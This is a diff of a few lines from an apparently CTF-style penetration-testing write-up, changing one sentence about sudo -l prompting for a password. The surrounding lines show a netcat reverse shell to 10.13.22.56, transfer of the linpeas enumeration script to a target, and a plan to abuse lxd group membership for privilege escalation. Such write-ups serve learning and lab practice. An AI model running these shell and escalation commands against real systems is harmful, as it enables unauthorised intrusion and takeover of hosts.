@@ -133,7 +133,7 @@ netcat 10.13.22.56 4444 -e /bin/bash
 - Let's get linpeas in our target `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`
 - `python3 -m http.server 80`
 - From our target `wget http://10.13.22.56/linpeas.sh` and `chmod +x linpeas.sh`
-- We are part of interesting groups such as lxd sudo and adm. However sudo -l does not give anything back. Let's try to abuse lxd and follow [this article](https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/) 
+- We are part of interesting groups such as lxd sudo and adm. However sudo -l does not give anything back (we get prompted for the password). Let's try to abuse lxd and follow [this article](https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/) 
 - To summarize here are the commands I ran (using the blog post as reference)
 
 ```
